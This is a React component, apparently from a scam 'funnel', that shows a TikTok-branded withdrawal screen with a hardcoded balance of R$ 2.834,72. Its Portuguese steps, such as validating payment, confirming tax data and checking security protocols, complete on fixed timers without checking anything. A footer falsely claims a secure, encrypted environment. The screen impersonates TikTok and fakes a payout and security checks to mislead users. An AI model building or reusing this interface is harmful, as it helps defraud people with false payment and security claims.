import { useEffect, useState } from "react";
import { Loader2, CheckCircle2, Shield } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";

interface FunnelProcessingScreenProps {
  onComplete: () => void;
  balance?: string;
}

const FunnelProcessingScreen = ({ onComplete, balance = "R$ 2.834,72" }: FunnelProcessingScreenProps) => {
  const [step, setStep] = useState(0);

  const steps = [
    { text: "Validando pagamento...", delay: 800 },
    { text: "Confirmando dados fiscais...", delay: 1200 },
    { text: "Preparando liberação do saque...", delay: 1000 },
    { text: "Verificando protocolos de segurança...", delay: 1000 },
  ];

  useEffect(() => {
    let timeout: ReturnType<typeof setTimeout>;

    const advance = (current: number) => {
      if (current < steps.length) {
        timeout = setTimeout(() => {
          setStep(current + 1);
          advance(current + 1);
        }, steps[current].delay);
      } else {
        timeout = setTimeout(onComplete, 600);
      }
    };

    advance(0);
    return () => clearTimeout(timeout);
  }, [onComplete]);

  return (
    <div className="fixed inset-0 z-[200] bg-white flex flex-col items-center justify-center px-6">
      <img src={tiktokLogo} alt="TikTok" className="h-8 object-contain mb-8" />

      <div className="w-16 h-16 rounded-full bg-emerald-50 flex items-center justify-center mb-6">
        <Loader2 className="w-8 h-8 text-emerald-500 animate-spin" />
      </div>

      <h2 className="text-gray-900 text-lg font-bold mb-1">Processando seu saque</h2>
      <p className="text-emerald-600 text-xl font-extrabold mb-6">{balance}</p>

      <div className="w-full max-w-xs space-y-3">
        {steps.map((s, i) => (
          <div key={i} className="flex items-center gap-3">
            {i < step ? (
              <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0" />
            ) : i === step ? (
              <Loader2 className="w-4 h-4 text-gray-400 animate-spin shrink-0" />
            ) : (
              <div className="w-4 h-4 rounded-full border-2 border-gray-200 shrink-0" />
            )}
            <span className={`text-sm ${i < step ? 'text-emerald-600 font-medium' : i === step ? 'text-gray-700' : 'text-gray-300'}`}>
              {s.text}
            </span>
          </div>
        ))}
      </div>

      <div className="flex items-center gap-1.5 mt-8">
        <Shield className="w-3 h-3 text-gray-300" />
        <span className="text-gray-400 text-[10px]">Ambiente seguro • Dados criptografados</span>
      </div>
    </div>
  );
};

export default FunnelProcessingScreen;
